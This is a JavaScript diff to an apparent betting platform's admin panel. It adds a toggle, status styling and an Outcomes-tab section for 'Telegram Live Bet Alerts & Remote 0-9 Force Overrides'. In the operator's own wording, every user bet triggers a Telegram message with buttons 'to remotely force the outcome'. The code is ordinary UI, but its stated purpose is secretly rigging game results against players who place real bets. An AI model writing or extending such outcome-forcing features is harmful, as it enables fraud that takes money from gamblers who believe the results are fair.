@@ -38,6 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
     initModeChips();
     initDeveloperPortal();
     initSoundToggle();
+    initTelegramBetAlertToggle();
     initHelpModalListeners();
     initSidebarToggle();
 });
@@ -246,6 +247,52 @@ function initSoundToggle() {
     }
 }
 
+function updateTelegramAlertsHeaderUI(enabled) {
+    const btn = document.getElementById('admin-tg-bet-toggle-btn');
+    const icon = document.getElementById('tg-bet-icon');
+    const text = document.getElementById('tg-bet-status-text');
+    if (!btn) return;
+    if (enabled) {
+        btn.style.background = 'rgba(16, 185, 129, 0.15)';
+        btn.style.borderColor = 'rgba(16, 185, 129, 0.3)';
+        btn.style.color = '#10b981';
+        if (icon) icon.textContent = '✈️';
+        if (text) text.textContent = 'Bet Alerts: ON';
+    } else {
+        btn.style.background = 'rgba(56, 189, 248, 0.12)';
+        btn.style.borderColor = 'rgba(56, 189, 248, 0.3)';
+        btn.style.color = '#38bdf8';
+        if (icon) icon.textContent = '✈️';
+        if (text) text.textContent = 'Bet Alerts: OFF';
+    }
+}
+
+function initTelegramBetAlertToggle() {
+    const btn = document.getElementById('admin-tg-bet-toggle-btn');
+    if (!btn) return;
+
+    btn.addEventListener('click', async () => {
+        const currentlyEnabled = !!(liveData && liveData.config && liveData.config.telegramBetAlertsEnabled);
+        const newState = !currentlyEnabled;
+        btn.disabled = true;
+        try {
+            const res = await adminService.toggleTelegramBetAlerts(newState);
+            if (res && res.success) {
+                if (liveData && liveData.config) {
+                    liveData.config.telegramBetAlertsEnabled = res.enabled;
+                }
+                updateTelegramAlertsHeaderUI(res.enabled);
+                renderActiveTab(false);
+                alert(`✓ Telegram Live Bet Alerts ${res.enabled ? 'ENABLED' : 'DISABLED'}!${res.enabled ? '\nEvery placed bet will trigger a Telegram alert with 0-9 force buttons.' : ''}`);
+            }
+        } catch (err) {
+            alert(`❌ Failed to toggle Telegram alerts: ${err.message}`);
+        } finally {
+            btn.disabled = false;
+        }
+    });
+}
+
 function initAuthFlow() {
     const authScreen = document.getElementById('admin-auth-screen');
     const pinInput = document.getElementById('auth-pin-input');
@@ -374,6 +421,10 @@ async function fetchAndRefreshData() {
 
         if (isFirstSync) {
             isFirstSync = false;
+        }
+
+        if (liveData && liveData.config) {
+            updateTelegramAlertsHeaderUI(liveData.config.telegramBetAlertsEnabled);
         }
 
         renderActiveTab(false);
@@ -646,6 +697,29 @@ function renderOutcomesView(container) {
                 </div>
             </div>
 
+            <!-- TELEGRAM LIVE BET ALERTS & REMOTE OVERRIDE SECTION -->
+            <div style="background: rgba(14, 165, 233, 0.08); border: 1px solid rgba(14, 165, 233, 0.25); border-radius: 10px; padding: 12px; margin-bottom: 12px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
+                    <div>
+                        <div style="display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 800; color: #38bdf8;">
+                            <span>✈️</span>
+                            <span>Telegram Live Bet Alerts & Remote 0-9 Force Overrides</span>
+                        </div>
+                        <div style="font-size: 10px; color: var(--text-muted); margin-top: 3px;">
+                            When enabled, every user bet instantly alerts your Telegram with 0-9 buttons to remotely force the outcome.
+                        </div>
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span style="font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 6px; background: ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'rgba(16,185,129,0.2)' : 'rgba(239,68,68,0.2)'}; color: ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'var(--accent-green)' : 'var(--accent-red)'}; border: 1px solid ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'var(--accent-green)' : 'var(--accent-red)'};">
+                            ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'ALERTS ON' : 'ALERTS OFF'}
+                        </span>
+                        <button id="btn-toggle-telegram-alerts" type="button" class="btn-secondary" style="background: ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'rgba(239,68,68,0.2)' : 'rgba(14,165,233,0.2)'}; color: ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'var(--accent-red)' : 'var(--accent-blue)'}; border: 1px solid ${liveData.config && liveData.config.telegramBetAlertsEnabled ? 'rgba(239,68,68,0.4)' : 'rgba(14,165,233,0.4)'}; font-size: 11px; font-weight: 800; padding: 6px 12px; cursor: pointer;">
+                            ${liveData.config && liveData.config.telegramBetAlertsEnabled ? '🔕 Disable Alerts' : '🔔 Enable Live Bet Alerts'}
+                        </button>
+                    </div>
+                </div>
+            </div>
+
             <!-- SECTION 1: Graceful Pause & State -->
             <div style="background: var(--bg-input); border: 1px solid var(--border-color); border-radius: 10px; padding: 10px; margin-bottom: 12px;">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
@@ -856,6 +930,31 @@ function renderOutcomesView(container) {
 
     // Attach Help Modals
     attachHelpModalHandlers(container);
+
+    // Telegram Live Bet Alert Toggle Button Listener in Outcomes Tab
+    const tgAlertBtn = container.querySelector('#btn-toggle-telegram-alerts');
+    if (tgAlertBtn) {
+        tgAlertBtn.addEventListener('click', async () => {
+            const currentlyEnabled = !!(liveData && liveData.config && liveData.config.telegramBetAlertsEnabled);
+            const newState = !currentlyEnabled;
+            tgAlertBtn.disabled = true;
+            tgAlertBtn.textContent = 'Updating...';
+            try {
+                const res = await adminService.toggleTelegramBetAlerts(newState);
+                if (res && res.success) {
+                    if (liveData && liveData.config) {
+                        liveData.config.telegramBetAlertsEnabled = res.enabled;
+                    }
+                    updateTelegramAlertsHeaderUI(res.enabled);
+                    renderActiveTab(false);
+                }
+            } catch (err) {
+                alert(`❌ Error updating Telegram alert settings: ${err.message}`);
+            } finally {
+                tgAlertBtn.disabled = false;
+            }
+        });
+    }
 
     // Mode Chips Event Listeners
     container.querySelectorAll('.mode-chip-btn').forEach(btn => {
